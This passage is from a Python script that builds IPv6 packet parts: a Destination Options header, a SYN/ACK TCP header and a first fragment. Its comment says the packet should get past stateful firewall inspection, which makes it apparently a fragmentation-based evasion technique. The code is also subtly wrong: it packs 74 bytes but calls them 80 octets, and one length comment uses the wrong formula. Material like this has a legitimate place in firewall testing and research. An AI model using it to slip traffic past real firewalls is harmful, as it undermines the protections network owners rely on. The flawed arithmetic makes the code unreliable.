    # This should pass a stateful firewall inspection
    doh_next_header = 6  # TCP
    doh_length = 9  # 80 octets / 8 - 2 = 9
    doh_header = struct.pack('!BB', doh_next_header, doh_length) + b'\x00' * 72  # 80 octets total
    
    tcp_flags_syn_ack = 0x12  # SYN=1, ACK=1
    tcp_header_syn_ack = build_tcp_header(12345, dst_port, 1000, 2000, tcp_flags_syn_ack)
    
    frag_offset_1 = 0
    more_fragments_1 = True
    frag_header_1 = build_fragment_header(60, frag_offset_1, more_fragments_1, identification) # 60 is DOH
    
    payload_1 = doh_header + tcp_header_syn_ack
    
